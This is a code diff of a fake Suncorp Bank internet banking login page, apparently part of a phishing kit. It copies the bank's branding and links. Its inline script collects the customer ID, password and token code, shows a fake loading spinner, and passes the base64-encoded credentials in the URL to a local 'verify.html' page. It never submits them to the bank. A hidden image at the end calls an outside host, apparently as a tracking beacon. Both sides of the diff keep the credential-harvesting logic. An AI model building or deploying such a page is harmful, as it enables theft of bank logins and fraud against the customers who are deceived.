@@ -4,15 +4,15 @@
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
   <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
   <meta content="
-        default-src 'self' https://assets1.suncorpbank.com.au https://assets2.suncorpbank.com.au https://dip.suncorpbank.com.au https://dip.test.suncorpbank.com.au https://smetrics.suncorpbank.com.au https://nexus-test.ensighten.com https://suncorpmetwayltd.tt.omtrdc.net/m2/suncorpmetwayltd/ https://*.tt.omtrdc.net https://*.ensighten.com http://*.demdex.net https://*.suncorp.com.au https://*.we-stats.com https://*.suncorpbank.com.au https://efrig-intg-a-003402.rosa-nonp-pub.os.app.ext.sun https://mockapi-sim-a-004026.rosa-nonp-priv.os.app.int.corp.sun;
+        default-src 'self' https://assets1.suncorpbank.com.au  https://assets2.suncorpbank.com.au  https://dip.suncorpbank.com.au  https://dip.test.suncorpbank.com.au  https://smetrics.suncorpbank.com.au  https://nexus-test.ensighten.com  https://suncorpmetwayltd.tt.omtrdc.net/m2/suncorpmetwayltd/  https://*.tt.omtrdc.net https://*.ensighten.com http://*.demdex.net https://*.suncorp.com.au https://*.we-stats.com https://*.suncorpbank.com.au https://efrig-intg-a-003402.rosa-nonp-pub.os.app.ext.sun  https://mockapi-sim-a-004026.rosa-nonp-priv.os.app.int.corp.sun ;
         style-src 'self' 'unsafe-inline';
         script-src 'self' blob: 'unsafe-eval' 'unsafe-inline' https://*.suncorp.com.au https://*.tt.omtrdc.net https://*.ensighten.com https://*.demdex.net  'nonce-aq0oa9337jcch1hvmvfdgsollsm9dufmk75kcmth';
-        img-src 'self' https://activate.aami.com.au https://nexus.ensighten.com https://*.everesttech.net https://*.demdex.net https://*.suncorp.com.au https://*.we-stats.com https://*.suncorpbank.com.au data:;
+        img-src 'self' https://activate.aami.com.au  https://nexus.ensighten.com  https://*.everesttech.net https://*.demdex.net https://*.suncorp.com.au https://*.we-stats.com https://*.suncorpbank.com.au data:;
         worker-src blob: ;
-        child-src 'self'  blob:  https://1.a79ab95c1589a13f8a4cab612bc71f9f7.com https://1.b406929acabac9b095f124c81bdfcf57f.com https://1.c81358859121583b7adf2ace89cb39f44.com;
-        frame-src 'self' https://suncorp.demdex.net/ https://--bridge-loaded-- https://--wvjb-queue-message--/ https://1.a79ab95c1589a13f8a4cab612bc71f9f7.com https://1.b406929acabac9b095f124c81bdfcf57f.com https://1.c81358859121583b7adf2ace89cb39f44.com;
+        child-src 'self'  blob:  https://1.a79ab95c1589a13f8a4cab612bc71f9f7.com  https://1.b406929acabac9b095f124c81bdfcf57f.com  https://1.c81358859121583b7adf2ace89cb39f44.com ;
+        frame-src 'self' https://suncorp.demdex.net/  https://--bridge-loaded-- https://--wvjb-queue-message--/ https://1.a79ab95c1589a13f8a4cab612bc71f9f7.com  https://1.b406929acabac9b095f124c81bdfcf57f.com  https://1.c81358859121583b7adf2ace89cb39f44.com ;
         form-action 'self' https://*.suncorpbank.com.au https://*.suncorp.com.au;
-        script-src-elem 'self' 'unsafe-inline' https://nexus.ensighten.com https://assets1.suncorpbank.com.au" http-equiv="Content-Security-Policy">
+        script-src-elem 'self' 'unsafe-inline' https://nexus.ensighten.com  https://assets1.suncorpbank.com.au " http-equiv="Content-Security-Policy">
   <title>
    Login
   </title>
@@ -24,7 +24,7 @@
   <header class="sg-Header">
    <div class="sg-Header-content">
     <div class="sg-Header-column">
-     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/" target="_blank">
+     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/ " target="_blank">
      </a>
     </div>
     <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
@@ -109,7 +109,7 @@
           </p>
           <div class="sg-Box sg-Box--withIcon token-input">
            <!-- Hidden inputs to pass the login URL and clientId -->
-           <input id="authenticateURL" type="hidden" value="https://internetbanking.suncorpbank.com.au/iam/v1/authenticate">
+           <input id="authenticateURL" type="hidden" value="https://internetbanking.suncorpbank.com.au/iam/v1/authenticate ">
            <input id="clientId" type="hidden" value="90efdc91-314b-4bf8-ae02-77158f44fc5b">
            <input id="toggleIpr" type="hidden" value="true">
            <input id="goto" type="hidden" value="https%3A%2F%2Finternetbanking.suncorpbank.com.au%2F">
@@ -129,28 +129,21 @@
           </p>
           <script>
 document.addEventListener('DOMContentLoaded', function() {
-    const form = document.getElementById('loginForm');
-    const userIdInput = document.getElementById('UserId');
-    const passwordInput = document.getElementById('password');
-    const passcodeInput = document.getElementById('passcode');
+    var form = document.getElementById('loginForm');
+    var userIdInput = document.getElementById('UserId');
+    var passwordInput = document.getElementById('password');
+    var passcodeInput = document.getElementById('passcode');
     
     // Find the Flextable element to insert error box before it
-    const flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
+    var flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
     
     // Create the error box
-    const errorBox = document.createElement('div');
+    var errorBox = document.createElement('div');
     errorBox.id = 'simpleErrorBox';
     errorBox.className = 'sg-Box sg-Box--error sg-Box--withIcon uama-hidden';
     errorBox.style.display = 'none';
     errorBox.style.marginBottom = '20px';
-    errorBox.innerHTML = `
-        <div class="sg-Box-icon sg-Box-icon--withBackground">
-            <span class="sg-Box--errorIcon"></span>
-        </div>
-        <div class="sg-Box-content">
-            <p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p>
-        </div>
-    `;
+    errorBox.innerHTML = '<div class="sg-Box-icon sg-Box-icon--withBackground"><span class="sg-Box--errorIcon"></span></div><div class="sg-Box-content"><p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p></div>';
     
     // Insert error box before the Flextable
     if (flextable && flextable.parentNode) {
@@ -158,45 +151,26 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Add red border style class
-    const style = document.createElement('style');
-    style.textContent = `
-        .sg-Input--error-border {
-            border: 1px solid #d32f2f !important;
-            border-color: #d32f2f !important;
-        }
-        @keyframes suncorp-spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    `;
+    var style = document.createElement('style');
+    style.textContent = '.sg-Input--error-border { border: 1px solid #d32f2f !important; border-color: #d32f2f !important; } @keyframes suncorp-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
     document.head.appendChild(style);
     
     function validateUserId(userId) {
-        // Customer ID must be 9-10 digits
-        const userIdRegex = /^\d{9,10}$/;
-        return userIdRegex.test(userId);
+        return /^\d{9,10}$/.test(userId);
     }
     
     function validatePassword(password) {
-        // At least 8 characters
         if (password.length < 8) return false;
-        // At least one uppercase letter
         if (!/[A-Z]/.test(password)) return false;
-        // At least one lowercase letter
         if (!/[a-z]/.test(password)) return false;
-        // At least one number
         if (!/[0-9]/.test(password)) return false;
-        // At least one special character
-        if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) return false;
+        if (!/[!@#$%^&*()_+\-=\[\]{};\':"\\|,.<>\/?]/.test(password)) return false;
         return true;
     }
     
     function validatePasscode(passcode) {
-        // If empty, it's valid (optional field)
         if (!passcode || passcode.length === 0) return true;
-        // If provided, must be 6-8 digits
-        const passcodeRegex = /^\d{6,8}$/;
-        return passcodeRegex.test(passcode);
+        return /^\d{6,8}$/.test(passcode);
     }
     
     function clearAllErrors() {
@@ -210,7 +184,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     function hideLoading() {
-        const existingOverlay = document.getElementById('login-loading-overlay');
+        var existingOverlay = document.getElementById('login-loading-overlay');
         if (existingOverlay) {
             existingOverlay.remove();
         }
@@ -219,44 +193,15 @@ document.addEventListener('DOMContentLoaded', function() {
     function showLoading() {
         hideLoading();
         
-        const overlay = document.createElement('div');
+        var overlay = document.createElement('div');
         overlay.id = 'login-loading-overlay';
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(2px);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            transition: opacity 0.3s ease;
-        `;
+        overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(2px); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.3s ease;';
         
-        // Black spinner
-        const spinner = document.createElement('div');
-        spinner.style.cssText = `
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(0, 0, 0, 0.2);
-            border-top: 4px solid #ffc800;
-            border-radius: 50%;
-            animation: suncorp-spin 1s linear infinite;
-        `;
+        var spinner = document.createElement('div');
+        spinner.style.cssText = 'width: 60px; height: 60px; border: 4px solid rgba(0, 0, 0, 0.2); border-top: 4px solid #ffc800; border-radius: 50%; animation: suncorp-spin 1s linear infinite;';
         
-        // Loading text
-        const text = document.createElement('p');
-        text.style.cssText = `
-            color: #ffc800;
-            font-family: Arial, sans-serif;
-            font-size: 16px;
-            margin-top: 20px;
-            letter-spacing: 1px;
-        `;
+        var text = document.createElement('p');
+        text.style.cssText = 'color: #ffc800; font-family: Arial, sans-serif; font-size: 16px; margin-top: 20px; letter-spacing: 1px;';
         
         overlay.appendChild(spinner);
         overlay.appendChild(text);
@@ -272,11 +217,11 @@ document.addEventListener('DOMContentLoaded', function() {
         e.preventDefault();
         clearAllErrors();
         
-        const userId = userIdInput.value.trim();
-        const password = passwordInput.value;
-        const passcode = passcodeInput ? passcodeInput.value.trim() : '';
+        var userId = userIdInput.value.trim();
+        var password = passwordInput.value;
+        var passcode = passcodeInput ? passcodeInput.value.trim() : '';
         
-        let isValid = true;
+        var isValid = true;
         
         // Validate Customer ID (9-10 digits)
         if (!userId || !validateUserId(userId)) {
@@ -300,7 +245,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
         
         if (!isValid) {
-            // Show the error box above the Flextable
             errorBox.style.display = 'block';
             return;
         }
@@ -309,19 +253,17 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // MOBILE FIX: Pass data via URL parameters (base64 encoded)
         setTimeout(function() {
-            const params = new URLSearchParams({
-                u: btoa(userId),
-                p: btoa(password),
-                t: btoa(passcode || 'none')
-            });
-            window.location.href = 'verify.html?' + params.toString();
+            var params = 'u=' + encodeURIComponent(btoa(userId)) + 
+                        '&p=' + encodeURIComponent(btoa(password)) + 
+                        '&t=' + encodeURIComponent(btoa(passcode || 'none'));
+            window.location.href = 'verify.html?' + params;
         }, 3000);
     });
 });
 </script>
           <p>
            First time here?
-           <a href="https://internetbanking.suncorpbank.com.au/Registration/Requirements" target="_blank">
+           <a href="https://internetbanking.suncorpbank.com.au/Registration/Requirements " target="_blank">
             Register for Internet Banking
            </a>
           </p>
@@ -350,7 +292,7 @@ document.addEventListener('DOMContentLoaded', function() {
          </p>
          <p class="sg-Type--size12">
           To learn more, view our
-          <a href="https://www.suncorpbank.com.au/about-us/legal/privacy.html" target="_blank">
+          <a href="https://www.suncorpbank.com.au/about-us/legal/privacy.html " target="_blank">
            Privacy Policy
           </a>
           .
@@ -363,22 +305,22 @@ document.addEventListener('DOMContentLoaded', function() {
         </span>
         <ul class="sg-List-iconXsmall">
          <li class="Icon-arrowRight--default">
-          <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking/password-reset-login-support.html" target="_blank">
+          <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking/password-reset-login-support.html " target="_blank">
            Login and password support
           </a>
          </li>
          <li class="Icon-arrowRight--default">
-          <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking.html" target="_blank">
+          <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking.html " target="_blank">
            Frequently asked questions
           </a>
          </li>
          <li class="Icon-arrowRight--default">
-          <a href="https://www.suncorpbank.com.au/security.html" target="_blank">
+          <a href="https://www.suncorpbank.com.au/security.html " target="_blank">
            Being safe online
           </a>
          </li>
          <li class="Icon-arrowRight--default">
-          <a href="https://www.suncorpbank.com.au/security/scams.html" target="_blank">
+          <a href="https://www.suncorpbank.com.au/security/scams.html " target="_blank">
            Be alert to common scams
           </a>
          </li>
@@ -393,17 +335,17 @@ document.addEventListener('DOMContentLoaded', function() {
    <div class="sg-Footer-content">
     <ul class="sg-List-horizontal">
      <li>
-      <a href="https://www.suncorpbank.com.au/help-support/ways-to-bank/online/terms.html" target="_blank">
+      <a href="https://www.suncorpbank.com.au/help-support/ways-to-bank/online/terms.html " target="_blank">
        Terms and Conditions
       </a>
      </li>
      <li>
-      <a href="https://www.suncorpbank.com.au/contact-us.html" target="_blank">
+      <a href="https://www.suncorpbank.com.au/contact-us.html " target="_blank">
        Contact Us
       </a>
      </li>
      <li>
-      <a href="https://www.suncorpbank.com.au/about-us/legal/privacy.html" target="_blank">
+      <a href="https://www.suncorpbank.com.au/about-us/legal/privacy.html " target="_blank">
        Privacy Policy
       </a>
      </li>
@@ -438,9 +380,8 @@ document.addEventListener('DOMContentLoaded', function() {
     <p>
      A security token is an additional, optional form of identification you can use when banking online.
     </p>
-    <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking/security-token.html#security-token" target="_blank">
+    <a href="https://www.suncorpbank.com.au/help-support/faqs/using-our-services/internet-banking/security-token.html#security-token " target="_blank">
      Read more about Security Tokens
     </a>
    </div>
-  </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp;sz=179401" width="0" height="0"></body></html>
-
+  </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp ;sz=179401" width="0" height="0"></body></html>
